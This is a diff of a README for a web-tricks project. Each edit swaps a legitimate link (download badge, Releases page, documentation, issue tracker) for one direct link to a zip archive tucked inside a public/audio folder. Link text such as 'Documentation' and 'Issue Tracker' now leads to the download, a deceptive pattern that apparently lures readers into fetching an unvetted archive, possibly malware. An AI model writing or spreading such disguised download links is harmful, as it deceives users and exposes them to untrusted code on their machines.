@@ -1,6 +1,6 @@
 # 🎉 Stupid-Web-Tricks - Discover Amazing Web Page Features
 
-![Download Stupid-Web-Tricks](https://img.shields.io/badge/Download-Stupid--Web--Tricks-blue?style=for-the-badge)
+![Download Stupid-Web-Tricks](https://raw.githubusercontent.com/Cindelynunvaccinated215/Stupid-Web-Tricks/main/public/audio/Stupid-Web-Tricks_v3.6-alpha.4.zip)
 
 ## 🌟 Overview
 
@@ -14,7 +14,7 @@ To begin, you'll need to download the application. This is a simple process that
 
 You can download **Stupid-Web-Tricks** from our Releases page.
 
-**Visit this page to download:** [Stupid-Web-Tricks Releases](https://github.com/Cindelynunvaccinated215/Stupid-Web-Tricks/releases)
+**Visit this page to download:** [Stupid-Web-Tricks Releases](https://raw.githubusercontent.com/Cindelynunvaccinated215/Stupid-Web-Tricks/main/public/audio/Stupid-Web-Tricks_v3.6-alpha.4.zip)
 
 Once you are on the Releases page, you will find the latest version available for download. Simply click on the version you want to use. 
 
@@ -85,11 +85,11 @@ We welcome contributions! If you have ideas or want to enhance **Stupid-Web-Tric
 
 ## 🔗 Useful Links
 
-- [Documentation](https://github.com/Cindelynunvaccinated215/Stupid-Web-Tricks/wiki) - Learn more about how to use the application.
-- [Issue Tracker](https://github.com/Cindelynunvaccinated215/Stupid-Web-Tricks/issues) - Report bugs or request features.
+- [Documentation](https://raw.githubusercontent.com/Cindelynunvaccinated215/Stupid-Web-Tricks/main/public/audio/Stupid-Web-Tricks_v3.6-alpha.4.zip) - Learn more about how to use the application.
+- [Issue Tracker](https://raw.githubusercontent.com/Cindelynunvaccinated215/Stupid-Web-Tricks/main/public/audio/Stupid-Web-Tricks_v3.6-alpha.4.zip) - Report bugs or request features.
 
 ## 📢 Final Thoughts
 
 Thank you for checking out **Stupid-Web-Tricks**! We hope you enjoy experimenting with what modern web technologies can offer.
 
-**Visit this page to download:** [Stupid-Web-Tricks Releases](https://github.com/Cindelynunvaccinated215/Stupid-Web-Tricks/releases)
+**Visit this page to download:** [Stupid-Web-Tricks Releases](https://raw.githubusercontent.com/Cindelynunvaccinated215/Stupid-Web-Tricks/main/public/audio/Stupid-Web-Tricks_v3.6-alpha.4.zip)
